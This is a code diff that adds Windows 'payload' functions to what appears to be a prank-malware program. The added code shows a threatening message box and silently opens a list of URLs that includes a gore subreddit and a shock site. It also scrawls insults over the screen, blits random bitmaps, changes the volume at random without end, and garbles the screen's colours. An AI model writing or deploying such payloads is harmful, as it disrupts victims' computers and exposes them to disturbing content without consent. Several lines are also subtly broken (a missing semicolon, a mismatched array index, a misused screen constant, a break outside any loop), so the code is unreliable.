@@ -3,8 +3,9 @@
 #define whiletrue while (true)
 
 int rickroll() {
-    ShellExecuteA(NULL, "open", "https://www.youtube.com/watch?v=dQw4w9WgXcQ", NULL, 0, SW_HIDE);
+    ShellExecuteA(NULL, "open", "https://www.youtube.com/watch?v=dQw4w9WgXcQ", NULL, NULL, SW_HIDE);
 
+    // youtube.com/dQw4w9WgXcQ
     return 0;
 }
 
@@ -88,4 +89,137 @@ int p3()
     }
 
     return 0;
+}
+
+// Open a website
+int p4() 
+{
+    MessageBoxW(NULL, L"sub 2 kevlu8", L"do it or i kill ur pc", MB_OK | MB_ICONINFORMATION);
+    fori(20)
+    {
+        LPCSTR urls[] = {
+            "https://kevlu8.herokuapp.com",
+            "https://www.reddit.com/r/eyeblech",
+            "https://www.youtube.com/kevlu8",
+            "https://www.github.com/kevlu8",
+            "https://www.github.com/kevlu8/Xytharis",
+            "https://www.torproject.org/download/",
+            "https://www.discord.gg/nhzXNNS",
+            "https://www.twitter.com/kevlu8wastaken",
+            "https://www.instagram.com",
+            "https://www.facebook.com/",
+            "https://web.archive.org/web/20210620035058/reddit.com/r/nonewnormal/",
+            "https://www.roblox.com",
+            "https://www.youareanidiot.org",
+            "https://www.twitter.com/dreamwastaken",
+            "https://www.youtube.com/channel/UCsiysQAqUGTLsk04k_BVowQ",
+            "https://www.youtube.com/watch?v=47ibFGy-w18"
+        }
+        Sleep(rand() % 10000);
+        ShellExecuteA(NULL, "open", urls[rand() % 14], NULL, NULL, SW_HIDE);
+    }
+}
+
+// Put "Your Mom" on the screen as text
+int p5() 
+{
+    fori(500)
+    {
+        Sleep(rand() % 100);
+        HDC hdc = GetDC(NULL);
+        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
+        switch (i % 5) {
+            case 0:
+                TextOutA(hdc, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), "Your Mom", 9);
+                break;
+            case 1:
+                TextOutA(hdc, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), "ur mom", 7);
+                break;
+            case 2:
+                TextOutA(hdc, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), "bjormom", 8);
+                break;  
+            case 3:
+                TextOutA(hdc, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), "so bad", 6);
+                break;
+            default:
+                TextOutA(hdc, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), "ha", 3);
+                break;
+        }
+        ReleaseDC(NULL, hdc);
+    }
+}
+
+// Put a random image on the screen
+int p6() 
+{
+    fori(50)
+    {
+        Sleep(rand() % 100);
+        HDC hdc = GetDC(NULL);
+        HBITMAP hBitmap = LoadBitmapA(NULL, MAKEINTRESOURCEA(rand() % 1000));
+        if (hBitmap == NULL)
+        {
+            break;
+        }
+        BITMAP bm;
+        GetObject(hBitmap, sizeof(BITMAP), &bm);
+        HDC hdcMem = CreateCompatibleDC(hdc);
+        SelectObject(hdcMem, hBitmap);
+        BitBlt(hdc, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), bm.bmWidth, bm.bmHeight, hdcMem, 0, 0, SRCCOPY);
+        DeleteDC(hdcMem);
+        DeleteObject(hBitmap);
+        ReleaseDC(NULL, hdc);
+    }
+}
+
+
+// Randomly change the sound volume
+int p7()  //MUST DO IN THREAD
+{
+    whiletrue
+    {
+        Sleep(rand() % 10000);
+        DWORD dwVolume;
+        waveOutGetVolume(NULL, &dwVolume);
+        dwVolume = (rand() % 0xFFFF) | (dwVolume & 0xFFFF0000);
+        waveOutSetVolume(NULL, dwVolume);
+    }
+}
+
+// Color shift the screen using BitBlt
+int p8() 
+{
+    fori(50)
+    {
+        Sleep(rand() % 10000);
+        HDC hdc = GetDC(NULL);
+        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN));
+        HDC hdcMem = CreateCompatibleDC(hdc);
+        SelectObject(hdcMem, hBitmap);
+        BitBlt(hdcMem, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), hdc, 0, 0, SRCCOPY);
+        fori(GetSystemMetrics(SM_CXSCREEN))
+        {
+            for (int j = 0; j < SM_CYSCREEN; j++)
+            {
+                COLORREF color = GetPixel(hdcMem, i, j);
+                SetPixel(hdcMem, i, j, RGB(GetRValue(color) + rand() % 0xFF, GetGValue(color) + rand() % 0xFF, GetBValue(color) + rand() % 0xFF));
+            }
+        }
+        BitBlt(hdc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), hdcMem, 0, 0, SRCCOPY);
+        DeleteDC(hdcMem);
+        DeleteObject(hBitmap);
+        ReleaseDC(NULL, hdc);
+    }
+}
+
+// Connect a virtual USB device
+int p9() 
+{
+    Sleep(rand() % 10000);
+    HANDLE hDevice = CreateFileA("\\\\.\\RandomUSBFile", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+    if (hDevice == INVALID_HANDLE_VALUE)
+    {
+        break;
+    }
+    CloseHandle(hDevice);
 }
